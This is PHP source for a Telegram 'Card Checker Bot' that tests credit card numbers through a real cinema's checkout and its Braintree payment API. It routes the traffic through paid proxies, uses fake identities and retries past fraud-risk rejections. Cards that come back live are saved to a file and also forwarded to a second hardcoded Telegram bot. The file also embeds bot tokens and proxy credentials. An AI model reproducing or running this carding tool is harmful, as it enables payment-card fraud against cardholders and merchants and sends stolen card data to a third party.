<?php
error_reporting(E_ERROR | E_PARSE);

// Start session
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

include("userAgent.php");

// Telegram Bot Configuration - Use environment variables for security
define('BOT_TOKEN', getenv('BOT_TOKEN') ?: '8269957175:AAEA2PiWIt5s3KWsvRJRLRKXnY-tdko9z-4');
define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

// Proxy Configuration - Use environment variables
define('PROXY_HOST', getenv('PROXY_HOST') ?: 'proxy.okeyproxy.com:31212');
define('PROXY_AUTH', getenv('PROXY_AUTH') ?: 'customer-4nao708160-continent-AS-country-SG:7tzdwvba');

// Initialize
$agent = new userAgent();
$UA = $agent->generate();
$UAiPhone = $agent->generate('iphone');

// Create temp directory for cookies (cross-platform)
$tempDir = sys_get_temp_dir() . '/bot_cookies';
if (!is_dir($tempDir)) {
    mkdir($tempDir, 0755, true);
}
define('COOKIE_DIR', $tempDir);

// Get incoming message
$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    exit;
}

// Extract message data
$message = isset($update['message']) ? $update['message'] : null;
$chat_id = isset($message['chat']['id']) ? $message['chat']['id'] : null;
$text = isset($message['text']) ? trim($message['text']) : '';

if (!$chat_id) {
    exit;
}

// Handle commands
if ($text == '/start') {
    sendMessage($chat_id, "🤖 *Card Checker Bot*\n\n*Commands:*\n/check - Check a card\n/help - Show help\n\n*Format:*\nSend card as: `4350940005555920|07|2025`\nor `4350940005555920|07|2025|123`", true);
    exit;
}

if ($text == '/help') {
    sendMessage($chat_id, "📋 *Help*\n\n*Card Format:*\n`CCNUMBER|MM|YYYY|CVV`\n\n*Example:*\n`4350940005555920|07|2025|123`\n\nJust send the card to check!", true);
    exit;
}

// Check if message contains card data
if (preg_match('/^\d{15,16}\|/', $text)) {
    $cookie = random(10);
    $_SESSION['bG'] = [
        'useragent' => $agent->generate(),
    ];

    // Get random user info
    $info = json_decode(R('https://randomuser.me/api/'), true);
    extract(($i_ = [
        'n' => $info['results']['0']['name']['first'],
        'l' => $info['results']['0']['name']['last'],
        'e' => random(7) . '@gmail.com',
        'st' => $info['results']['0']['location']['street']['number'] . ' ' . $info['results']['0']['location']['street']['name'],
        'ct' => $info['results']['0']['location']['city'],
        'state' => $info['results']['0']['location']['state'],
        'country' => $info['results']['0']['location']['country'],
        'zip' => $info['results']['0']['location']['postcode'],
        'phn' => '212' . mt_rand(0000000, 9999999),
        'formkey' => random(16),
        'webkey' => random(16),
    ]));

    $card = $text;
    
    // Send processing message
    sendMessage($chat_id, "⏳ Checking: `$card`\n\nPlease wait...", true);

    try {
        extract(CC($card, 4));
        $type = $cc[0] == '4' ? 'Visa' : ($cc[0] == '5' ? 'mc' : 'JCB');
        $type2 = $cc[0] == '4' ? 'VI' : ($cc[0] == '5' ? 'MC' : 'JCB');
        $yy = strlen($yyyy) == 4 ? substr($yyyy, 2, 2) : $yyyy;

        $retry = 0;
        retry:

        $X = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/CreateOrder',
            [
                'proxy' => PROXY_HOST,
                'proxyuserpwd' => PROXY_AUTH,
                'ssl_verifypeer' => 0,
                'post' => 1,
                'postfields' => '{"cinemaId":"2110","userID":""}',
                'httpheader' => [
                    'content-type: application/json',
                ]
            ]
        );
        $userSessionId = json_decode($X)->Result->order->userSessionId;

        $Xe = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/PaymentClientToken',
            [
                'proxy' => PROXY_HOST,
                'proxyuserpwd' => PROXY_AUTH,
                'ssl_verifypeer' => 0,
                'post' => 1,
                'postfields' => '{"cinemaId":"2110"}',
                'httpheader' => [
                    'content-type: application/json',
                ]
            ]
        );
        $ClientToken = json_decode($Xe)->ClientToken;
        $authorizationFingerprint = g(base64_decode($ClientToken), '"authorizationFingerprint":"', '"');

        R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/AddConcessionsOrder',
            [
                'proxy' => PROXY_HOST,
                'proxyuserpwd' => PROXY_AUTH,
                'ssl_verifypeer' => 0,
                'post' => 1,
                'postfields' => '{"cinemaId":"2110","concessionItems":[{"Id":"144","HeadOfficeItemCode":"","HOPK":"144","Description":"BEER Santa Cruz Mtn Pacific IPA","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":950,"TaxInCents":84,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0025","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":1,"IsSeatDelivery":false}],"userSessionId":"' . $userSessionId . '","seats":[],"userID":""}',
                'httpheader' => [
                    'content-type: application/json',
                ]
            ]
        );

        $Xeb = R('https://payments.braintree-api.com/graphql',
            [
                'proxy' => PROXY_HOST,
                'proxyuserpwd' => PROXY_AUTH,
                'ssl_verifypeer' => 0,
                'post' => 1,
                'postfields' => '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"' . uuid4() . '"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' . $cc . '","expirationMonth":"' . $mm . '","expirationYear":"' . $yyyy . '","billingAddress":{"postalCode":"' . rand(11111, 99999) . '"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
                'httpheader' => [
                    'content-type: application/json',
                    'Authorization: Bearer ' . $authorizationFingerprint,
                    'braintree-version: 2018-05-10'
                ]
            ]
        );
        $token = json_decode($Xeb)->data->tokenizeCreditCard->token;

        $Xebe = R('https://www.santacruzcinema.com/wp-json/wp/v2/api/content/paymentapi/Checkout',
            [
                'proxy' => PROXY_HOST,
                'proxyuserpwd' => PROXY_AUTH,
                'ssl_verifypeer' => 0,
                'post' => 1,
                'postfields' => '{"PaymentToken":"' . $token . '","userSessionId":"' . $userSessionId . '","Name":"' . $n . ' ' . $l . '","Email":"' . $e . '","userID":"","skipBraintree":false,"skipAdvancedFraudChecking":true,"remainingOrderValue":-1}',
                'httpheader' => [
                    'content-type: application/json',
                ]
            ]
        );

        // Retry logic for risk_threshold and amount errors
        if ((strpos($Xebe, 'risk_threshold') || strpos($Xebe, 'Amount must be greater than zero') || strpos($Xebe, 'This order has either expired or it has already been processed')) && $retry < 3) {
            $retry++;
            REMOVE_COOKIE();
            sleep(2);
            goto retry;
        }

        if (strpos($Xebe, 'avs') || (strpos($Xebe, '"IsValid":true')) || (strpos($Xebe, 'Insufficient')) || (strpos($Xebe, 'Limit'))) {
            file_put_contents("CCNLIVES_TG.txt", $card . PHP_EOL, FILE_APPEND | LOCK_EX);
            forwardersd('Live Card '.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv, 6050175626);
            $errorMsg = json_decode($Xebe)->ErrorMessage;
            RESULT_TG($chat_id, 'live', "✅ *LIVE*\n\n💳 `$card`\n\n📝 *Response:*\nPayment Authorised [$errorMsg]");
        } elseif (strpos($Xebe, 'risk_threshold') && $retry >= 3) {
            RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nGateway Rejected: risk_threshold (after $retry retries)");
        } elseif (strpos($Xebe, 'Amount must be greater than zero') && $retry >= 3) {
            RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nError: Amount must be greater than zero (after $retry retries)");
        } elseif (strpos($Xebe, 'This order has either expired or it has already been processed') && $retry >= 3) {
                RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nError: This order has either expired or it has already been processed (after $retry retries)");
        } else {
            $errorMsg = json_decode($Xebe)->ErrorMessage;
            RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\n$errorMsg");
        }
    } catch (Exception $e) {
        sendMessage($chat_id, "⚠️ *ERROR*\n\n💳 `$card`\n\n📝 *Error:*\n" . $e->getMessage(), true);
    }
} else {
    sendMessage($chat_id, "❌ Invalid format!\n\nPlease send card in format:\n`CCNUMBER|MM|YYYY|CVV`\n\nExample:\n`4350940005555920|07|2025|123`", true);
}

// Functions
function sendMessage($chat_id, $text, $markdown = false)
{
    $url = API_URL . "sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
    ];
    if ($markdown) {
        $data['parse_mode'] = 'Markdown';
    }
    file_get_contents($url . '?' . http_build_query($data));
}

function RESULT_TG($chat_id, $status, $message)
{
    REMOVE_COOKIE();
    sendMessage($chat_id, $message, true);
    exit;
}

function g(string $str, string $start, string $end, bool $decode = false)
{
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
}

function forwardersd($message, $chat_id)
{
  $bot_token = '8173601851:AAEEl2Jo1KXHR4otDEGmCLjc7JuTElN1nGs'; // bot token
  $context = stream_context_create(array(
    'http' => array('ignore_errors' => true),
  ));
  file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $chat_id . '&text=' . $message . '&parse_mode=HTML', false, $context);
}

function R($u, $p = [], $t = 0)
{
    global $cookie;
    if (!$p) $p[l('customrequest')] = 'GET';
    else foreach ($p as $n => $s) {
        $p[l($n)] = $s;
        unset($p[$n]);
    }
    $p[l('returntransfer')] = 1;
    $p[l('timeout')] = 30;
    $p[l('connecttimeout')] = 10;
    foreach ($_SESSION['bG'] as $E => $N) {
        $p[l($E)] = $N;
    }
    $c = COOKIE_DIR . '/' . getmypid() . '_' . $t . '_' . $cookie . '.txt';
    $p[10031] = $c;
    $p[10082] = $c;
    $ch = curl_init($u);
    curl_setopt_array($ch, $p);
    $e = curl_exec($ch);
    curl_close($ch);
    return $e;
}

function l($a)
{
    return eval('return CURLOPT_' . strtoupper($a) . ';');
}

function CC($card, $validYYYY = 2)
{
    list($cc, $mm, $yyyy, $cvv) = explode('|', $card);
    $yyyy = strlen($yyyy) === 4 ? ($validYYYY === 2 ? substr($yyyy, 2) : $yyyy) : (strlen($yyyy) === 2 ? ($validYYYY === 4 ? '20' . $yyyy : $yyyy) : exit('INVALID EXP YEAR'));
    return [
        'cc' => $cc,
        'mm' => $mm,
        'yyyy' => $yyyy,
        'cvv' => $cvv
    ];
}

function random($l)
{
    $ch = implode('', range('a', 'z')) . implode('', range('A', 'Z'));
    $chs = strlen($ch);
    $str = '';
    for ($i = 0; $i <= $l; $i++) {
        $str .= $ch[mt_rand(0, $chs)];
    }
    return $str;
}

function randString($l)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $l; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

function REMOVE_COOKIE()
{
    global $cookie;
    $pid = getmypid();
    foreach (glob(COOKIE_DIR . '/' . $pid . '_*_' . $cookie . '.txt') as $value) {
        if (is_file($value)) {
            @unlink($value);
        }
    }
}

function uuid4()
{
    $data = random_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
